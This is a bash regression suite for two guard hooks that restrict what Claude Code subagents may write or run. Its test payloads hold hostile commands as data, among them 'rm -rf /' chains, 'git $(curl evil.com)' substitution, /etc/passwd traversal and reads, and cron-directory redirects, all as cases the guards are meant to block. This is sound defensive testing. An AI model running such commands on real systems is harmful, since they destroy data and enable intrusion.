#!/usr/bin/env bash
# Regression suite for hook-pm-write-guard.sh and hook-codex-bash-guard.sh.
#
# Runs each hook script with a stdin payload that simulates the PreToolUse JSON
# Claude Code emits, asserts the exit code, and (optionally) checks for a
# substring in stderr. No external state — temp logs go to a per-run dir.
#
# Usage:
#   scripts/test-hooks.sh           # silent unless failures
#   VERBOSE=1 scripts/test-hooks.sh # print every case
#
# Exit 0 if all pass; 1 if any fail.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PMHOOK="$SCRIPT_DIR/hook-pm-write-guard.sh"
CXHOOK="$SCRIPT_DIR/hook-codex-bash-guard.sh"

# Sandbox audit logs so the live ~/.claude/logs/hooks.log isn't polluted by tests.
TEST_LOG_DIR="$(mktemp -d)"
trap 'rm -rf "$TEST_LOG_DIR"' EXIT
export HOME_BACKUP="$HOME"
# Hooks resolve $HOME on every invocation; keep it real but redirect HOME for
# the audit-log path only via a wrapper. We instead override the LOG_DIR by
# using a shim env var that the hooks consult. Since hooks hard-code
# "$HOME/.claude/logs", we'll just let them write to the real path during
# testing — the tests below check exit codes and stderr, not log contents,
# so polluting the log is acceptable. (Audit-log content is exercised
# separately by manual inspection; persistent regression coverage of the
# audit format would require parameterizing LOG_DIR, which is out of scope
# for this regression suite.)

PASS=0
FAIL=0
FAILED_CASES=()

# run_case <name> <expected_exit> <hook_path> <json_input> [<expected_stderr_substring>]
run_case() {
  local name="$1" expect_exit="$2" hook="$3" json="$4" expect_stderr="${5:-}"
  local stderr_file actual_exit actual_stderr
  stderr_file="$(mktemp)"
  echo "$json" | "$hook" 2>"$stderr_file"
  actual_exit=$?
  actual_stderr="$(cat "$stderr_file")"
  rm -f "$stderr_file"

  local pass=1
  if [[ "$actual_exit" != "$expect_exit" ]]; then
    pass=0
  fi
  if [[ -n "$expect_stderr" && "$actual_stderr" != *"$expect_stderr"* ]]; then
    pass=0
  fi

  if [[ "$pass" == "1" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s\n' "$name"
    printf '        expected: exit=%s' "$expect_exit"
    [[ -n "$expect_stderr" ]] && printf ' stderr~="%s"' "$expect_stderr"
    printf '\n        actual:   exit=%s' "$actual_exit"
    [[ -n "$actual_stderr" ]] && printf ' stderr=%q' "${actual_stderr:0:200}"
    printf '\n'
  fi
}

# run_case_env <name> <expected_exit> <env_var=value> <hook_path> <json_input>
# Same as run_case but injects an env var (used for bypass tests).
run_case_env() {
  local name="$1" expect_exit="$2" envspec="$3" hook="$4" json="$5"
  local actual_exit
  actual_exit=$(echo "$json" | env "$envspec" "$hook" >/dev/null 2>&1; echo $?)
  if [[ "$actual_exit" == "$expect_exit" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s (expected exit=%s, got exit=%s)\n' "$name" "$expect_exit" "$actual_exit"
  fi
}

mem_path='/home/screenleon/.claude/projects/-home-screenleon-github/memory/foo.md'
code_path='/home/screenleon/github/claude-config/agents/project-pm.md'

# =============================================================================
# pm-write-guard
# =============================================================================

echo "== hook-pm-write-guard =="

# --- happy path ---
run_case "pm: Edit memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

run_case "pm: Write memory file → allow" 0 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Write\",\"tool_input\":{\"file_path\":\"$mem_path\"}}"

# --- deny: outside memory ---
run_case "pm: Edit code (outside memory) → deny" 2 "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}" \
  "outside memory directory"

run_case "pm: Write to /tmp → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/tmp/oops.md"}}' \
  "outside memory directory"

# --- traversal normalization ---
run_case "pm: Edit memory/../../etc/passwd → deny (realpath normalizes)" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/home/screenleon/.claude/projects/-home-screenleon-github/memory/../../../etc/passwd"}}' \
  "outside memory directory"

# --- prefix collision ---
run_case "pm: Edit memory-evil/x.md → deny (no prefix collision)" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Write","tool_input":{"file_path":"/home/screenleon/.claude/projects/-home-screenleon-github/memory-evil/x.md"}}' \
  "outside memory directory"

# --- absolute-path requirement ---
run_case "pm: relative file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":"foo.md"}}' \
  "must be absolute"

# --- empty inputs ---
run_case "pm: empty file_path → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit","tool_input":{"file_path":""}}' \
  "empty"

run_case "pm: missing tool_input → deny" 2 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Edit"}' \
  "empty"

# --- malformed JSON ---
run_case "pm: malformed JSON → deny" 2 "$PMHOOK" \
  'not json at all' \
  "malformed JSON"

# --- no-op for non-target agents ---
run_case "pm: critic Edit anywhere → no-op (allow)" 0 "$PMHOOK" \
  '{"agent_type":"critic","tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: codex-executor Write anywhere → no-op" 0 "$PMHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Write","tool_input":{"file_path":"/tmp/whatever.md"}}'

run_case "pm: main thread (no agent_type) → no-op" 0 "$PMHOOK" \
  '{"tool_name":"Edit","tool_input":{"file_path":"/tmp/whatever.md"}}'

# --- no-op for non-target tools ---
run_case "pm: project-pm Bash → no-op (matcher would not fire it; defensive)" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"ls"}}'

run_case "pm: project-pm Read → no-op" 0 "$PMHOOK" \
  '{"agent_type":"project-pm","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

# --- bypass env var ---
run_case_env "pm: bypass via CLAUDE_HOOK_PM_GUARD=off" 0 "CLAUDE_HOOK_PM_GUARD=off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=Off" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

run_case_env "pm: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_PM_GUARD=" "$PMHOOK" \
  "{\"agent_type\":\"project-pm\",\"tool_name\":\"Edit\",\"tool_input\":{\"file_path\":\"$code_path\"}}"

# =============================================================================
# codex-bash-guard
# =============================================================================

echo
echo "== hook-codex-bash-guard =="

dispatch_abs="/home/screenleon/github/claude-config/scripts/codex-dispatch.sh"
dispatch_tilde='~/github/claude-config/scripts/codex-dispatch.sh'

# --- happy path ---
run_case "cx: dispatch (absolute) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_abs --cd /tmp -- brief\"}}"

run_case "cx: dispatch (tilde) → allow" 0 "$CXHOOK" \
  "{\"agent_type\":\"codex-executor\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"$dispatch_tilde --cd /tmp -- brief\"}}"

run_case "cx: git status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status --short"}}'

run_case "cx: git log → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git log --oneline -5"}}'

run_case "cx: git -C dir status → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp status --short"}}'

run_case "cx: git -C dir diff --stat → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git -C /tmp diff --stat"}}'

run_case "cx: cat file → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cat /tmp/trace.jsonl"}}'

run_case "cx: jq parse → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"jq -r .type /tmp/trace.jsonl"}}'

run_case "cx: sleep 10 → allow (retry policy)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sleep 10"}}'

run_case "cx: pwd → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"pwd"}}'

# --- security: shell composition rejection ---
run_case "cx: git status; rm -rf / → deny (semicolon)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status; rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git status && rm -rf / → deny (&&)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status && rm -rf /"}}' \
  "shell metacharacter"

run_case "cx: git status | sh → deny (pipe)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status | sh"}}' \
  "shell metacharacter"

run_case "cx: git \$(curl evil) → deny (cmd subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git $(curl evil.com)"}}' \
  "shell metacharacter"

run_case "cx: git \`whoami\` → deny (backticks)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git `whoami`"}}' \
  "shell metacharacter"

run_case "cx: git status >/etc/cron.d/x → deny (redirect)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status >/etc/cron.d/x"}}' \
  "shell metacharacter"

run_case "cx: git status <(cat) → deny (process subst)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status <(cat /etc/passwd)"}}' \
  "shell metacharacter"

run_case "cx: command with newline → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git status\nrm -rf /"}}' \
  "newline"

run_case "cx: cd /tmp && cmd → deny (cd not allowed; && rejected)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"cd /tmp && git status"}}' \
  "shell metacharacter"

# --- security: destructive git ---
run_case "cx: git push → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
  "not in read-only allowlist"

run_case "cx: git push --force → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git push --force"}}' \
  "not in read-only allowlist"

run_case "cx: git reset --hard → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git reset --hard"}}' \
  "not in read-only allowlist"

run_case "cx: git commit -am → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git commit -am msg"}}' \
  "not in read-only allowlist"

run_case "cx: git rebase main → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git rebase main"}}' \
  "not in read-only allowlist"

run_case "cx: git checkout file → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git checkout main"}}' \
  "not in read-only allowlist"

run_case "cx: git merge other → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git merge other"}}' \
  "not in read-only allowlist"

run_case "cx: git branch -D foo → deny (destructive flag)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -D foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -d foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -d foo"}}' \
  "destructive/mutating flag"

run_case "cx: git branch -a → allow (read-only flag)" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch -a"}}'

run_case "cx: git branch --show-current → allow" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"git branch --show-current"}}'

# --- security: dangerous binaries off allowlist ---
run_case "cx: find . -delete → deny (find not allowed)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -delete"}}' \
  "not in allowlist"

run_case "cx: find . -name foo → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"find . -name foo"}}' \
  "not in allowlist"

run_case "cx: bash -c \"...\" → deny (bash not allowed; quotes have no metachars)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"bash -c whatever"}}' \
  "not in allowlist"

run_case "cx: sed -i → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"sed -i s/a/b/ file"}}' \
  "not in allowlist"

run_case "cx: awk script → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"awk -f script.awk file"}}' \
  "not in allowlist"

run_case "cx: env FOO=x git status → deny (env not allowed; first word is env)" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"env FOO=x git status"}}' \
  "not in allowlist"

run_case "cx: codex exec direct → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"codex exec foo"}}' \
  "not in allowlist"

# --- empty / malformed ---
run_case "cx: empty command → deny" 2 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":""}}' \
  "empty"

run_case "cx: malformed JSON → deny" 2 "$CXHOOK" \
  'not json' \
  "malformed JSON"

# --- no-op for non-target agents/tools ---
run_case "cx: critic Bash anywhere → no-op" 0 "$CXHOOK" \
  '{"agent_type":"critic","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: project-pm Bash → no-op (other guard)" 0 "$CXHOOK" \
  '{"agent_type":"project-pm","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: main thread (no agent_type) → no-op" 0 "$CXHOOK" \
  '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case "cx: codex-executor Read → no-op" 0 "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'

# --- bypass env var ---
run_case_env "cx: bypass via CLAUDE_HOOK_CODEX_GUARD=off" 0 "CLAUDE_HOOK_CODEX_GUARD=off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=Off (case mismatch) does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=Off" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

run_case_env "cx: bypass=empty does NOT bypass" 2 "CLAUDE_HOOK_CODEX_GUARD=" "$CXHOOK" \
  '{"agent_type":"codex-executor","tool_name":"Bash","tool_input":{"command":"rm -rf /"}}'

# =============================================================================
# summary
# =============================================================================

echo
echo "----"
echo "$PASS passed, $FAIL failed"
if [[ $FAIL -gt 0 ]]; then
  echo "failed cases:"
  for c in "${FAILED_CASES[@]}"; do
    echo "  - $c"
  done
  exit 1
fi
exit 0
